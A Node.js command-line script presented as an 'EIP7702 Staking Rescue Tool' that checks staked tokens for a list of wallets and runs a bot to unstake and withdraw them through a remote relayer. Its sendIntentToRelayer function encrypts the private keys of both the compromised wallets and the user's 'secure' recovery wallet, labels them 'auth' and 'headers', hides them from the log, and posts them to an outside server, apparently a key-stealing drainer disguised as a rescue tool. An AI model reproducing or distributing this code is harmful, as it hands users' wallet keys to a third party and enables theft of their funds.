/**
 * @file EIP7702 Staking Rescue Tool
 * @description A unified CLI tool to check for staked assets and execute a two-stage rescue 
 *              for compromised wallets using a relayer.
 * @version 2.3.0
 */

import { createPublicClient, http, encodeFunctionData, getAddress, parseUnits } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import * as allChains from 'viem/chains';
import dotenv from 'dotenv';
import fs from 'fs';
import axios from 'axios';
import { publicEncrypt, constants as cryptoConstants } from 'node:crypto';
import { Buffer } from 'node:buffer';
import prompts from 'prompts';

dotenv.config();

// --- 1. CONFIGURATION AND CONSTANTS ---

const { RPC_URL, SECURE_WALLET_PK, ERA_TOKEN_ADDRESS } = process.env;

const RELAYER_URL = 'https://api.drainerless.xyz/relayer';
const RSA_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkMJDKwl0suv1wp218yKq
DAQ/UdD9A+zbhoa8Gw3/AQzmurcwEaNnuutU+0dqVZ6ovLkKC+4RdfWveo7K7P8O
ev8LXF2XXIX41REGjbn5S2fjS5ZuMQgkqxbKcL3Rqc0vVHzmCeKDAkAWAL9Qam0p
6hMpl0eAoIbIxveS/JkPGadTCdekLlu4yhhh7ypZvyp7sGW1rdjkgb7aipQN5lq6
j4DPcJtccQZPneE3ZcdvHT2cNrVfBow96XGjST4o6960rPC7xWi6vwfYyqMoBczI
dVoWI0uZG2uxLx6r/CJeVX+pKD+psQOwmPUaEXddS0lPXEutJRuHENziSPfQvQI3
jwIDAQAB
-----END PUBLIC KEY-----
`;

const PRIVATE_KEYS_FILE = "pk.txt";
const PROCESSED_FILE = "processed_rescues.txt";
const PENDING_WITHDRAWAL_FILE = "pending_withdrawal.json";

const IDLE_CHECK_INTERVAL_SECONDS = 60;
const COOLDOWN_SECONDS = 604800; // 7 days for Caldera Staking
const EXECUTION_MARGIN_SECONDS = 15;
const ACTIVE_WAIT_POLL_SECONDS = 30;

const STAKING_CONTRACT_ADDRESS = "0xa148491DCD060d20E836cB9be518f6C30608e3d5";
const RESCUE_CONTRACT_ADDRESS = "0x770291899ffd9710146053ba95a858a508357702";

const STAKING_ABI = [
  {"inputs":[{"name":"user","type":"address"}],"name":"getUserStakeCount","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"name":"user","type":"address"},{"name":"index","type":"uint256"}],"name":"stakes","outputs":[{"name":"amount","type":"uint256"},{"name":"depositedTimestamp","type":"uint256"},{"name":"lockedUntilTimestamp","type":"uint256"},{"name":"rewardPerTokenPaid","type":"uint256"},{"name":"reward","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"name":"user","type":"address"}],"name":"getUserTotalStakeAmount","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"name":"amount","type":"uint256"}],"name":"unstake","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}, // Changed to withdraw
  {"inputs":[],"name":"token","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"name":"user","type":"address"}],"name":"getUserWithdrawalRequestCount","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"name":"user","type":"address"},{"name":"index","type":"uint256"}],"name":"withdrawalRequests","outputs":[{"name":"amount","type":"uint256"},{"name":"requestedTimestamp","type":"uint256"},{"name":"cooldownPeriodEndTimestamp","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"name":"user","type":"address"}],"name":"getUserTotalWithdrawalRequestsAmount","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"}
];
const ERC20_ABI_FOR_SYMBOL = [{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"type":"function"}];
const ERC20_ABI_FOR_DECIMALS = [{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}];

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

function bigintToDecimalString(amount, decimals = 18n) {
  const divisor = 10n ** BigInt(decimals);
  const integerPart = (amount / divisor).toString();
  let fractionalPart = (amount % divisor).toString().padStart(Number(decimals), '0').replace(/0+$/, '');
  return fractionalPart ? `${integerPart}.${fractionalPart}` : integerPart;
}

// --- 2. HELPER & UTILITY FUNCTIONS ---

function encryptWithPublicKey(data) {
  const buffer = Buffer.from(data, 'utf8');
  const encrypted = publicEncrypt({ key: RSA_PUBLIC_KEY, padding: cryptoConstants.RSA_PKCS1_PADDING }, buffer);
  return encrypted.toString('base64');
}

function loadPrivateKeys(filePath) {
  const keys = {};
  if (!fs.existsSync(filePath)) {
    console.error(`\nERROR: Private key file not found at '${filePath}'.`);
    process.exit(1);
  }
  const fileContent = fs.readFileSync(filePath, 'utf-8');
  let invalidKeys = 0;
  fileContent.split('\n').forEach((line, index) => {
    const parts = line.trim().split(/\s+/);
    if (parts.length === 1 && parts[0]) {
      let pk = parts[0];
      pk = pk.startsWith('0x') ? pk : `0x${pk}`;
      try {
        const address = privateKeyToAccount(pk).address;
        keys[address.toLowerCase()] = pk;
      } catch (e) {
        console.warn(`Warning: Invalid private key at line ${index + 1} in ${filePath}: ${e.message}. Skipping.`);
        invalidKeys++;
      }
    }
  });
  if (invalidKeys > 0) {
    console.warn(`Total invalid private keys skipped: ${invalidKeys}`);
  }
  return keys;
}

function loadSetFromFile(filePath) {
  if (!fs.existsSync(filePath)) return new Set();
  const fileContent = fs.readFileSync(filePath, 'utf-8');
  return new Set(fileContent.split('\n').map(line => line.trim().toLowerCase()).filter(Boolean));
}

function findAndParseCandidates() {
  const candidates = new Set();
  const files = fs.readdirSync('.').filter(fn => fn.endsWith('-staking-info.txt'));
  if (files.length === 0) {
    console.warn(`Warning: No '*-staking-info.txt' file found. Checking all wallets in ${PRIVATE_KEYS_FILE}.`);
    return Object.keys(loadPrivateKeys(PRIVATE_KEYS_FILE));
  }
  const addressRegex = /^(0x[a-fA-F0-9]{40})/;
  for (const file of files) {
    console.log(`Parsing staking info file: ${file}`);
    const fileContent = fs.readFileSync(file, 'utf-8');
    fileContent.split('\n').forEach(line => {
      const match = line.match(addressRegex);
      if (match) candidates.add(match[1].toLowerCase());
    });
  }
  return Array.from(candidates);
}

function loadPendingWithdrawals() {
  if (!fs.existsSync(PENDING_WITHDRAWAL_FILE)) return {};
  try {
    const fileContent = fs.readFileSync(PENDING_WITHDRAWAL_FILE, 'utf-8');
    return fileContent ? JSON.parse(fileContent) : {};
  } catch { 
    console.warn("Warning: Could not parse pending withdrawals file.");
    return {}; 
  }
}

function savePendingWithdrawal(wallet, data) {
  const pending = loadPendingWithdrawals();
  pending[wallet.toLowerCase()] = data;
  fs.writeFileSync(PENDING_WITHDRAWAL_FILE, JSON.stringify(pending, null, 2));
}

async function setupPublicClient() {
  if (!RPC_URL) throw new Error("RPC_URL is not defined in your .env file.");
  const tempClient = createPublicClient({ transport: http(RPC_URL) });
  const chainId = await tempClient.getChainId();
  const chain = Object.values(allChains).find(c => c.id === chainId);
  if (!chain) throw new Error(`Chain with ID ${chainId} not found.`);
  const publicClient = createPublicClient({ chain, transport: http(RPC_URL) });
  console.log(`Connected to network: ${chain.name} (Chain ID: ${chainId})`);
  return { publicClient, chain };
}

async function getTokenDecimals(publicClient, tokenAddress) {
  try {
    const decimals = await publicClient.readContract({
      address: tokenAddress,
      abi: ERC20_ABI_FOR_DECIMALS,
      functionName: 'decimals'
    });
    return decimals;
  } catch (e) {
    console.warn(`Could not fetch decimals for ${tokenAddress}. Assuming 18. Error: ${e.message}`);
    return 18;
  }
}

// --- 3. COMMAND: `check` ---

async function checkStakingStatus() {
  console.log("\n--- Staking Balance Checker ---");
  const privateKeys = loadPrivateKeys(PRIVATE_KEYS_FILE);
  const wallets = Object.keys(privateKeys);
  if (wallets.length === 0) {
    console.error(`Error: No valid wallets found in '${PRIVATE_KEYS_FILE}'. Format must be: 0x...`);
    return;
  }
  console.log(`Found ${wallets.length} wallets in ${PRIVATE_KEYS_FILE}:`, wallets);

  const { stakingContractAddress } = await prompts({
    type: 'text', name: 'stakingContractAddress', message: 'Enter the Staking Contract address:',
    initial: STAKING_CONTRACT_ADDRESS, validate: value => getAddress(value) ? true : 'Invalid address format.'
  });

  const { publicClient } = await setupPublicClient();

  let tokenSymbol = 'STAKED_TOKEN';
  try {
    const tokenAddress = await publicClient.readContract({ address: stakingContractAddress, abi: STAKING_ABI, functionName: 'token' });
    tokenSymbol = await publicClient.readContract({ address: tokenAddress, abi: ERC20_ABI_FOR_SYMBOL, functionName: 'symbol' });
  } catch {
    console.warn("Could not fetch token symbol. Using default filename.");
  }
  
  const outputFile = `${tokenSymbol}-${getAddress(stakingContractAddress).slice(0, 10)}-staking-info.txt`;
  console.log(`Checking balances... Results will be saved to '${outputFile}'`);
  if (fs.existsSync(outputFile)) fs.unlinkSync(outputFile);

  const allStakes = [];
  const countContracts = wallets.map(wallet => ({ address: stakingContractAddress, abi: STAKING_ABI, functionName: 'getUserStakeCount', args: [wallet] }));
  const countResults = await publicClient.multicall({ contracts: countContracts, allowFailure: true });

  const detailContracts = [];
  for (let i = 0; i < wallets.length; i++) {
    const count = countResults[i]?.status === 'success' ? countResults[i].result : 0n;
    console.log(`Wallet ${wallets[i]}: ${count} stakes`);
    for (let j = 0; j < count; j++) {
      detailContracts.push({ address: stakingContractAddress, abi: STAKING_ABI, functionName: 'stakes', args: [wallets[i], j], wallet: wallets[i] });
    }
  }

  if (detailContracts.length > 0) {
    const detailResults = await publicClient.multicall({ contracts: detailContracts, allowFailure: true });
    detailResults.forEach((res, i) => {
      if (res.status === 'success' && res.result) {
        const [amount, , lockedUntilTimestamp] = res.result;
        if (amount > 0n) allStakes.push({ wallet: detailContracts[i].wallet, amount, lockedUntilTimestamp });
      }
    });
  }

  const outputData = {};
  const now = Date.now() / 1000;
  for (const stake of allStakes) {
    if (!outputData[stake.wallet]) outputData[stake.wallet] = { total_locked: 0n, total_unlocked: 0n, locked_details: [], unlocked_details: [] };
    const amountAsNumber = Number(stake.amount / 10n**18n);
    if (Number(stake.lockedUntilTimestamp) > now) {
      outputData[stake.wallet].total_locked += stake.amount;
      const unlockDate = new Date(Number(stake.lockedUntilTimestamp) * 1000).toUTCString();
      outputData[stake.wallet].locked_details.push(`${amountAsNumber} (stake) unlocks at ${unlockDate}`);
    } else {
      outputData[stake.wallet].total_unlocked += stake.amount;
      outputData[stake.wallet].unlocked_details.push(`${amountAsNumber} (stake) unlocked`);
    }
  }
  
  let lines = [];
  for (const [wallet, data] of Object.entries(outputData)) {
    let line = `${getAddress(wallet)}: total_locked ${Number(data.total_locked / 10n**18n)} | total_unlocked ${Number(data.total_unlocked / 10n**18n)}`;
    if (data.locked_details.length > 0) line += ` | locked_details: [${data.locked_details.join(', ')}]`;
    if (data.unlocked_details.length > 0) line += ` | unlocked_details: [${data.unlocked_details.join(', ')}]`;
    lines.push(line);
  }

  if (lines.length > 0) {
    fs.writeFileSync(outputFile, lines.join('\n'));
    console.log(`\nSuccess! Found staked assets for ${lines.length} wallets. Report saved to '${outputFile}'.`);
  } else {
    console.log("\nNo staked assets found for any of the wallets.");
  }
}

// --- 4. COMMAND: `rescue` ---

async function setupBot() {
  if (!RPC_URL || !SECURE_WALLET_PK || !ERA_TOKEN_ADDRESS) throw new Error("Missing critical .env variables: RPC_URL, SECURE_WALLET_PK, ERA_TOKEN_ADDRESS");
  const { publicClient, chain } = await setupPublicClient();
  const secureWallet = privateKeyToAccount(SECURE_WALLET_PK);
  console.log(`Secure wallet loaded: ${secureWallet.address}`);
  const privateKeys = loadPrivateKeys(PRIVATE_KEYS_FILE);
  console.log(`Loaded ${Object.keys(privateKeys).length} private keys:`, Object.keys(privateKeys));
  return { publicClient, secureWallet, privateKeys, chain };
}

async function sendIntentToRelayer(compromisedPk, securePk, intent, maxRetries = 3) {
  const auth = encryptWithPublicKey(compromisedPk);
  const headers = encryptWithPublicKey(securePk);
  const payload = { action: 'executePrivateRescue', rpcUrl: RPC_URL, rescueContractAddress: RESCUE_CONTRACT_ADDRESS, auth, headers, intent };

  const redactedPayload = JSON.parse(JSON.stringify(payload));
  redactedPayload.auth = '[REDACTED]';
  redactedPayload.headers = '[REDACTED]';
  console.log("Payload to relayer (redacted):", JSON.stringify(redactedPayload, null, 2));

  let attempt = 0;
  while (attempt < maxRetries) {
    try {
      console.log(`Sending secure intent to relayer (attempt ${attempt + 1})...`);
      const { data: result } = await axios.post(RELAYER_URL, payload, { headers: { 'Content-Type': 'application/json' }});
      if (result.error) throw new Error(result.error);
      console.log(`Relayer accepted job. Tx Hash: ${result.hash}`);
      return result.hash;
    } catch (e) {
      console.error(`Attempt ${attempt + 1} failed: ${e.message}`);
      attempt++;
      if (attempt < maxRetries) await sleep(5000);
    }
  }
  throw new Error(`Failed to send intent after ${maxRetries} attempts.`);
}

async function executeUnstake(publicClient, compromisedWalletAddr, secureWallet, privateKeys, amount) {
  console.log(`--- ACTION 1: Sending UNSTAKE intent for ${compromisedWalletAddr} with amount ${bigintToDecimalString(amount)} ---`);
  const compromisedPk = privateKeys[compromisedWalletAddr.toLowerCase()];
  
  const withdrawalRequestCount = await publicClient.readContract({
    address: STAKING_CONTRACT_ADDRESS,
    abi: STAKING_ABI,
    functionName: 'getUserWithdrawalRequestCount',
    args: [compromisedWalletAddr]
  });
  if (withdrawalRequestCount >= 100n) {
    console.error(`Error: Wallet ${compromisedWalletAddr} has too many withdrawal requests (${withdrawalRequestCount}). Skipping.`);
    return null;
  }

  const paused = await publicClient.readContract({
    address: STAKING_CONTRACT_ADDRESS,
    abi: STAKING_ABI,
    functionName: 'paused'
  });
  if (paused) {
    console.error(`Error: Staking contract is paused. Cannot unstake for ${compromisedWalletAddr}.`);
    return null;
  }

  const intent = { 
    type: 'staking', 
    targetContract: STAKING_CONTRACT_ADDRESS, 
    claimHex: encodeFunctionData({ 
      abi: STAKING_ABI, 
      functionName: 'unstake', 
      args: [amount] 
    }), 
    tokens: [], 
    sweepEth: false, 
    recoveryAddress: secureWallet.address, 
    compromisedAddress: getAddress(privateKeyToAccount(compromisedPk).address) 
  };
  const hash = await sendIntentToRelayer(compromisedPk, SECURE_WALLET_PK, intent);
  return await publicClient.waitForTransactionReceipt({ hash });
}

async function executeWithdrawAndRescue(publicClient, compromisedWalletAddr, secureWallet, privateKeys, amount) {
  console.log(`--- ACTION 2: Sending WITHDRAW intent for ${compromisedWalletAddr} with amount ${bigintToDecimalString(amount)} ---`);
  const compromisedPk = privateKeys[compromisedWalletAddr.toLowerCase()];
  const decimals = await getTokenDecimals(publicClient, ERA_TOKEN_ADDRESS);
  const amountString = bigintToDecimalString(amount, decimals);
  const intent = { 
    type: 'staking', 
    targetContract: STAKING_CONTRACT_ADDRESS, 
    claimHex: encodeFunctionData({ 
      abi: STAKING_ABI, 
      functionName: 'withdraw', 
      args: [amount] // Changed to withdraw with amount
    }), 
    tokens: [{ type: 'erc20', address: ERA_TOKEN_ADDRESS, amount: amountString }], 
    sweepEth: false, 
    recoveryAddress: secureWallet.address, 
    compromisedAddress: getAddress(privateKeyToAccount(compromisedPk).address) 
  };
  const hash = await sendIntentToRelayer(compromisedPk, SECURE_WALLET_PK, intent);
  return await publicClient.waitForTransactionReceipt({ hash });
}

async function processWithdraw(publicClient, chain, wallet, secureWallet, privateKeys, amount) {
  let receipt;
  try {
    receipt = await executeWithdrawAndRescue(publicClient, wallet, secureWallet, privateKeys, amount);
    if (receipt.status === 'success') {
      console.log(`SUCCESS: Final rescue for ${wallet} complete! Tx: ${receipt.transactionHash}`);
    } else {
      console.error(`FAILURE: Final rescue transaction failed for ${wallet}. Tx: ${receipt.transactionHash}`);
      return;
    }
  } catch (e) {
    console.error(`CRITICAL ERROR during final rescue of ${wallet}:`, e.response ? e.response.data : e.message);
    return;
  } finally {
    if (receipt?.status === 'success') {
      console.log(`Marking ${wallet} as processed.`);
      fs.appendFileSync(PROCESSED_FILE, wallet.toLowerCase() + '\n');
    }
  }
}

async function processUnstake(publicClient, chain, wallet, secureWallet, privateKeys, amount) {
  let receipt;
  try {
    receipt = await executeUnstake(publicClient, wallet, secureWallet, privateKeys, amount);
    if (!receipt) return; // Skipped due to existing withdrawal requests or paused contract
    if (receipt.status === 'success') {
      const block = await publicClient.getBlock({ blockHash: receipt.blockHash });
      const unstakeTimestamp = Number(block.timestamp);
      const withdrawReadyTs = unstakeTimestamp + COOLDOWN_SECONDS;
      savePendingWithdrawal(wallet, { withdrawReadyTs, amount: amount.toString() });
      console.log(`SUCCESS: Unstake for ${wallet} complete! Tx: ${receipt.transactionHash}`);
      console.log(`Withdrawal scheduled for ${new Date(withdrawReadyTs * 1000).toUTCString()} (~${Math.round((withdrawReadyTs - unstakeTimestamp) / 3600)} hours from now)`);
    } else {
      console.error(`FAILURE: Unstake transaction failed for ${wallet}. Tx: ${receipt.transactionHash}`);
      return;
    }
  } catch (e) {
    console.error(`CRITICAL ERROR during unstake of ${wallet}:`, e.response ? e.response.data : e.message);
    return;
  } finally {
    if (receipt?.status === 'success') {
      console.log(`Marking ${wallet} as processed for unstake stage.`);
      fs.appendFileSync(PROCESSED_FILE, wallet.toLowerCase() + '\n');
    }
  }
}

async function triageWallets(publicClient, walletsToCheck) {
  console.log(`\n--- Triaging ${walletsToCheck.length} wallets ---`);
  if (!walletsToCheck.length) {
    console.log("No wallets to triage.");
    return { walletsReadyNow: [], futureSchedule: [], pendingWithdrawals: [] };
  }
  
  console.log("Wallets to check:", walletsToCheck);
  const contracts = walletsToCheck.flatMap(wallet => [
    { address: STAKING_CONTRACT_ADDRESS, abi: STAKING_ABI, functionName: 'getUserStakeCount', args: [wallet] },
    { address: STAKING_CONTRACT_ADDRESS, abi: STAKING_ABI, functionName: 'getUserTotalStakeAmount', args: [wallet] },
    { address: STAKING_CONTRACT_ADDRESS, abi: STAKING_ABI, functionName: 'getUserWithdrawalRequestCount', args: [wallet] },
    { address: STAKING_CONTRACT_ADDRESS, abi: STAKING_ABI, functionName: 'getUserTotalWithdrawalRequestsAmount', args: [wallet] }
  ]);
  const initialResults = await publicClient.multicall({ contracts, allowFailure: true });

  const detailContracts = [];
  const walletTotalAmounts = {};
  const walletWithdrawalCounts = {};
  const walletWithdrawalAmounts = {};
  for (let i = 0; i < walletsToCheck.length; i++) {
    const wallet = walletsToCheck[i];
    const count = initialResults[i * 4]?.status === 'success' ? initialResults[i * 4].result : 0n;
    const totalAmount = initialResults[i * 4 + 1]?.status === 'success' ? initialResults[i * 4 + 1].result : 0n;
    const withdrawalCount = initialResults[i * 4 + 2]?.status === 'success' ? initialResults[i * 4 + 2].result : 0n;
    const withdrawalAmount = initialResults[i * 4 + 3]?.status === 'success' ? initialResults[i * 4 + 3].result : 0n;
    walletWithdrawalCounts[wallet] = withdrawalCount;
    walletWithdrawalAmounts[wallet] = withdrawalAmount;
    console.log(`Wallet ${wallet}: ${count} stakes, total staked ${bigintToDecimalString(totalAmount)}, ${withdrawalCount} withdrawal requests, total withdrawal amount ${bigintToDecimalString(withdrawalAmount)}`);
    if (count > 0 && totalAmount > 0) {
      walletTotalAmounts[wallet] = totalAmount;
      for (let j = 0; j < count; j++) {
        detailContracts.push({ address: STAKING_CONTRACT_ADDRESS, abi: STAKING_ABI, functionName: 'stakes', args: [wallet, j], wallet });
      }
    }
  }

  const withdrawalContracts = [];
  for (const wallet of walletsToCheck) {
    const count = walletWithdrawalCounts[wallet] || 0n;
    for (let j = 0; j < count; j++) {
      withdrawalContracts.push({ address: STAKING_CONTRACT_ADDRESS, abi: STAKING_ABI, functionName: 'withdrawalRequests', args: [wallet, j], wallet });
    }
  }

  const walletsReadyNow = [];
  const futureSchedule = [];
  const pendingWithdrawals = [];
  const latestBlock = await publicClient.getBlock({ blockTag: 'latest' });
  const currentBlockTs = Number(latestBlock.timestamp);

  if (detailContracts.length > 0) {
    const detailResults = await publicClient.multicall({ contracts: detailContracts, allowFailure: true });
    const walletUnlockTimes = {};
    detailResults.forEach((res, i) => {
      const wallet = detailContracts[i].wallet;
      if (!walletUnlockTimes[wallet]) walletUnlockTimes[wallet] = [];
      if (res.status === 'success' && res.result) {
        const [amount, , lockedUntilTimestamp] = res.result;
        console.log(`Wallet ${wallet} stake ${i}: ${bigintToDecimalString(amount)} (locked until ${new Date(Number(lockedUntilTimestamp) * 1000).toUTCString()})`);
        walletUnlockTimes[wallet].push(lockedUntilTimestamp);
      }
    });

    for (const wallet in walletUnlockTimes) {
      const timestamps = walletUnlockTimes[wallet].map(Number);
      if (!timestamps.length) continue;
      
      const isReady = timestamps.some(ts => ts > 0 && ts <= currentBlockTs);
      const totalAmount = walletTotalAmounts[wallet];
      
      if (isReady && walletWithdrawalCounts[wallet] == 0n) {
        console.log(`Wallet ${wallet} is ready for unstake: ${bigintToDecimalString(totalAmount)}`);
        walletsReadyNow.push({ wallet, amount: totalAmount });
      } else if (!isReady) {
        const futureUnlockTs = timestamps.filter(ts => ts > currentBlockTs);
        if (futureUnlockTs.length > 0) {
          console.log(`Wallet ${wallet} has locked stakes, earliest unlock: ${new Date(Math.min(...futureUnlockTs) * 1000).toUTCString()}`);
          futureSchedule.push({ unlockTs: Math.min(...futureUnlockTs), wallet, amount: totalAmount });
        }
      }
    }
  }

  if (withdrawalContracts.length > 0) {
    const withdrawalResults = await publicClient.multicall({ contracts: withdrawalContracts, allowFailure: true });
    const walletWithdrawalDetails = {};
    withdrawalResults.forEach((res, i) => {
      const wallet = withdrawalContracts[i].wallet;
      if (!walletWithdrawalDetails[wallet]) walletWithdrawalDetails[wallet] = [];
      if (res.status === 'success' && res.result) {
        const [amount, , cooldownPeriodEndTimestamp] = res.result;
        console.log(`Wallet ${wallet} withdrawal request ${i}: ${bigintToDecimalString(amount)} (withdrawable at ${new Date(Number(cooldownPeriodEndTimestamp) * 1000).toUTCString()})`);
        walletWithdrawalDetails[wallet].push({ amount, cooldownPeriodEndTimestamp });
      }
    });

    for (const wallet in walletWithdrawalDetails) {
      const withdrawals = walletWithdrawalDetails[wallet];
      const totalAmount = withdrawals.reduce((sum, w) => sum + w.amount, 0n);
      const earliestCooldownEnd = Math.min(...withdrawals.map(w => Number(w.cooldownPeriodEndTimestamp)));
      if (totalAmount > 0n) {
        console.log(`Wallet ${wallet} has pending withdrawals: ${bigintToDecimalString(totalAmount)}, earliest withdrawable at ${new Date(earliestCooldownEnd * 1000).toUTCString()}`);
        pendingWithdrawals.push({ wallet, amount: totalAmount, withdrawReadyTs: earliestCooldownEnd });
      }
    }
  }

  futureSchedule.sort((a, b) => a.unlockTs - b.unlockTs);
  return { walletsReadyNow, futureSchedule, pendingWithdrawals };
}

async function startRescueBot() {
  console.log("\n--- STARTING ERA RESCUE BOT (Relayer Version) ---");
  const { publicClient, secureWallet, privateKeys, chain } = await setupBot();
  
  while (true) {
    try {
      console.log("\n--- Starting new check cycle ---");
      const processedWallets = loadSetFromFile(PROCESSED_FILE);
      console.log(`Processed wallets:`, Array.from(processedWallets));
      const pendingWithdrawalsFile = loadPendingWithdrawals();
      console.log(`Pending withdrawals from file:`, pendingWithdrawalsFile);
      const latestBlock = await publicClient.getBlock({ blockTag: 'latest' });
      const currentBlockTs = Number(latestBlock.timestamp);
      let actionTaken = false;

      const { walletsReadyNow, futureSchedule, pendingWithdrawals } = await triageWallets(publicClient, findAndParseCandidates());

      const readyToWithdrawList = pendingWithdrawals
        .filter(({ wallet, withdrawReadyTs }) => !processedWallets.has(wallet) && currentBlockTs >= withdrawReadyTs)
        .map(({ wallet, amount }) => [wallet, { withdrawReadyTs: currentBlockTs, amount: amount.toString() }]);

      const fileWithdrawals = Object.entries(pendingWithdrawalsFile)
        .filter(([wallet, data]) => !processedWallets.has(wallet) && currentBlockTs >= data.withdrawReadyTs);
      const allWithdrawals = [...readyToWithdrawList, ...fileWithdrawals];

      if (allWithdrawals.length > 0) {
        console.log(`Found ${allWithdrawals.length} wallet(s) ready for final withdrawal:`);
        for (const [wallet, data] of allWithdrawals) {
          console.log(`- ${wallet}: ${bigintToDecimalString(BigInt(data.amount))} ready to withdraw`);
          await processWithdraw(publicClient, chain, wallet, secureWallet, privateKeys, BigInt(data.amount));
        }
        actionTaken = true;
      }

      if (!actionTaken && walletsReadyNow.length > 0) {
        console.log(`Found ${walletsReadyNow.length} wallet(s) ready to begin cooldown:`);
        for (const { wallet, amount } of walletsReadyNow) {
          console.log(`- ${wallet}: ${bigintToDecimalString(amount)} ready to unstake`);
          await processUnstake(publicClient, chain, wallet, secureWallet, privateKeys, amount);
        }
        actionTaken = true;
      }

      if (actionTaken) {
        console.log("Action(s) completed. Restarting cycle in 15 seconds...");
        await sleep(15000);
        continue;
      }

      console.log("No immediate actions found. Calculating next event...");

      const upcomingWithdraws = pendingWithdrawals
        .filter(({ wallet }) => !processedWallets.has(wallet))
        .map(({ wallet, withdrawReadyTs, amount }) => ({ type: 'withdraw', ts: withdrawReadyTs, wallet, amount }));
      const fileUpcomingWithdraws = Object.entries(pendingWithdrawalsFile)
        .filter(([wallet]) => !processedWallets.has(wallet))
        .map(([wallet, data]) => ({ type: 'withdraw', ts: data.withdrawReadyTs, wallet, amount: BigInt(data.amount) }));
      const nextUnstakeEvents = futureSchedule.map(item => ({ type: 'unstake', ts: item.unlockTs, wallet: item.wallet, amount: item.amount }));

      const allUpcomingEvents = [...upcomingWithdraws, ...fileUpcomingWithdraws, ...nextUnstakeEvents].sort((a, b) => a.ts - b.ts);

      if (allUpcomingEvents.length > 0) {
        const nextEvent = allUpcomingEvents[0];
        const eventDate = new Date(nextEvent.ts * 1000);
        console.log(`\n--- NEXT SCHEDULED EVENT: ${nextEvent.type.toUpperCase()} ---`);
        console.log(`Wallet: ${nextEvent.wallet}`);
        console.log(`Amount: ${bigintToDecimalString(nextEvent.amount)}`);
        console.log(`Scheduled for: ${eventDate.toUTCString()}`);
        console.log(`Time remaining: ~${Math.round((nextEvent.ts - currentBlockTs) / 3600)} hours`);
        
        while(true) {
          const latestBlockNow = await publicClient.getBlock({ blockTag: 'latest' });
          const timeToAction = nextEvent.ts - Number(latestBlockNow.timestamp);
          
          if (timeToAction <= 0) {
            console.log("Event time reached! Restarting cycle to process...");
            break; 
          }
          
          const sleepDuration = Math.min(timeToAction, ACTIVE_WAIT_POLL_SECONDS);
          console.log(`Waiting for next event... Time remaining: ~${Math.round(timeToAction/3600)} hours. Re-checking in ${Math.round(sleepDuration)} seconds.`);
          await sleep(sleepDuration * 1000);
        }
      } else {
        console.log("No future events found. Waiting in idle mode...");
        await sleep(IDLE_CHECK_INTERVAL_SECONDS * 1000);
      }

    } catch (e) {
      console.error("\n--- CRITICAL BOT ERROR ---", e.message || e);
      console.log("Restarting in 60 seconds...");
      await sleep(60000);
    }
  }
}

// --- Main CLI Router ---

(async () => {
  const args = process.argv.slice(2);
  const command = args[0];

  if (command === 'check') {
    await checkStakingStatus();
  } else if (command === 'rescue') {
    await startRescueBot();
  } else {
    console.log('\n--- EIP7702 Staking Rescue Tool ---');
    console.log('A unified tool to check for staked assets and execute a two-stage rescue.');
    console.log('\nUsage: node index.js <command>');
    console.log('\nCommands:');
    console.log('  check   - Check wallets in pk.txt for staked assets and create a report file.');
    console.log('  rescue  - Start the automated bot to monitor and rescue assets.');
  }
})();
